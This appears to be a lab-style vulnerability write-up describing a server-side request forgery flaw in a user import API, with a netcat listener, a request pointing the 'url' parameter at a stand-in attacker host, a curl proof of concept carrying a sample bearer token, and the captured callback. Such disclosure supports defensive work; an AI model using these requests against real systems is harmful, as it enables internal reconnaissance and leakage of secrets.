# Server-side Request Forgery

## Overview

A Server-side Request Forgery (SSRF) vulnerability exists in user import API at the following endpoint:

```
http://localhost:5000/api/users/import
```

## Exploitation

The API endpoint expects a query parameter `url` pointing to a URL from where to import the contents. This can be tampered to make the application query any URL. This can be verified by setting up a local listener:

Start `netcat` listener:

```
$ nc -lv 1111
```

On sending a `GET` request to the affected API endpoint, we can verify the SSRF in our listener:

```
http://rws.local:5000/api/users/import?url=http://attacker.ip:1111/aa
```

```
curl -X GET \
  'http://localhost:5000/api/users/import?url=http://127.0.0.1:1111/aa' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoidGVzdEB0ZXN0LmNvbSIsInJvbGUiOiJVc2VyIiwiZXhwIjoxNTI2NTM1MTQzLCJpc3MiOiJodHRwOi8vbG9jYWxob3N0LmxvY2FsLyIsImF1ZCI6Imh0dHA6Ly9sb2NhbGhvc3QubG9jYWwvIn0.61BWoAXpLul1Kj1IYlL4jTJK1kUSHSXuQxZvNmNc-C4' \
```

```
$ nc -lv 1111

GET /aa HTTP/1.1
Host: 127.0.0.1:1111
Accept: */*
```

## Impact

An attacker can exploit this issue to leak internal infrastructure related information by attempting to connect to various internal resources and inspecting the error message received from the application.

This issue may also leak internal secrets if the application include them as part of the HTTP request sent to un-trusted endpoints.